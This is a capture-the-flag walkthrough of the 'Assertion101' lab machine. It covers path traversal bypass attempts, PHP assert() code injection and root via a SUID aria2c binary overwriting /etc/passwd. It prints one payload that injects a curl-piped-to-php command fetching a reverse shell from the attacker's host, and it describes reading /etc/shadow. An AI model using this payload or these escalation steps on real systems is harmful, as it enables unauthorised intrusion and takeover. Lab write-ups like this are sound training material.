# Assertion101

## Background

> Are you ready to assert yourself?

- Author: [Faisal Husaini](https://www.vulnhub.com/entry/assertion-1,495/)

- Released on: Sep 16, 2020

- Difficulty: Intermediate

> Overall difficulty for me: Medium

# Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan Result:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Assertion101/images/a1.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Assertion101/images/a2.png)

According to `rustscan` result, we have 2 ports are opened:

Ports Open        | Service
------------------|------------------------
22                | OpenSSH 7.6p1
80                | Apache httpd 2.4.29

## HTTP on Port 80

Always check the web server first, as it has the largest attack vectors.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Assertion101/images/a3.png)

The `index.php` might suffers path traversal? Let's test it out:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Assertion101/images/a4.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Assertion101/images/a5.png)

Looks like there is some sort of filter going on.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Assertion101/images/a6.png)

Maybe it's blocking `.` to prevent path traversal.

How about using URL encoding to bypass the filter?

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Assertion101/images/a7.png)

Nope. How about double URL encoding?

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Assertion101/images/a8.png)

Looks like it's bypassed?

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Assertion101/images/a9.png)

Hmm... Weird. It should bypassed and could fetch `/etc/passwd`'s content.

At this moment, I'm stucked. Then I started to think the title of this machine is somewhat related to the path traversal. Let's google "assertion local file inclusion".

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Assertion101/images/a10.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Assertion101/images/a11.png)

Wow! I never know PHP `assert()` function is vulnerable to Local File Inclusion(LFI)! Let's test it to the target machine!

> Note: Mohamed F. did a great job explaining [this vulnerability](https://www.linkedin.com/pulse/php-assert-vulnerable-local-file-inclusion-mohamed-fakroud)!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Assertion101/images/a12.png)

Yes!! We now have LFI! Next step is to gain an initial foothold to the target system.

# Initial Foothold

Since we can execute any remote code to the target machine, we can leverage this to gain an initial foothold.

To do so, I'll first host a PHP reverse shell:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Assertion101/images/a13.png)

Then, we can use `curl`, pipe (`|`) and `php` to establish a reverse shell to us: (This is similar to PowerShell downloadstring trick.)

**Payload:**
```bash
http://192.168.129.94/index.php?page='.system("curl http://YOUR_IP/revshell.php | php").'
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Assertion101/images/a14.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Assertion101/images/a15.png)

We're `www-data`!

**Stable Shell via `socat`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Assertion101/images/a16.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Assertion101/images/a17.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Assertion101/images/a18.png)

**local.txt:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Assertion101/images/a19.png)

# Privilege Escalation

## www-data to root

**SUID:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Assertion101/images/a20.png)

Weird binary with SUID bit set: `/usr/bin/aria2c`.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Assertion101/images/a21.png)

It's owned by root! Let's investgate what is it!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Assertion101/images/a22.png)

Looks like [GTFOBins](https://gtfobins.github.io/gtfobins/aria2c/) could found something interesting:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Assertion101/images/a23.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Assertion101/images/a24.png)

But it's not working. :(

Maybe this machine don't have outbound connection, so it doesn't work?? Anyway, let's try another method.

As I dig deeper to the `aria2c` binary, I found that the `-i` option also could read files.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Assertion101/images/a25.png)

Let's try reading `/etc/shadow`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Assertion101/images/a26.png)

I could read `/etc/shadow`, but all the hashes are uncrackable.

How about overwriting a file? Like `/etc/passwd`.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Assertion101/images/a27.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Assertion101/images/a28.png)

Maybe?? Let's give it a shot.

First, copy and paste the `/etc/passwd`'s contents to the attacker machine:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Assertion101/images/a29.png)

Then, add a new user with root privilege:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Assertion101/images/a30.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Assertion101/images/a31.png)

Finally, overwrite the original `/etc/passwd` in the target machine:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Assertion101/images/a32.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Assertion101/images/a33.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Assertion101/images/a34.png)

YES!! We now can Switch User to the newly created user!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Assertion101/images/a35.png)

And we're root! :D

# Rooted

**proof.txt:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Assertion101/images/a36.png)

# Conclusion

What we've learned:

1. Path Traversal Filter Bypass
2. Local File Inclusion via `assert()` Function in PHP
3. Privilege Escalation via `aria2c` SUID Bit Set, Overwriting `/etc/passwd`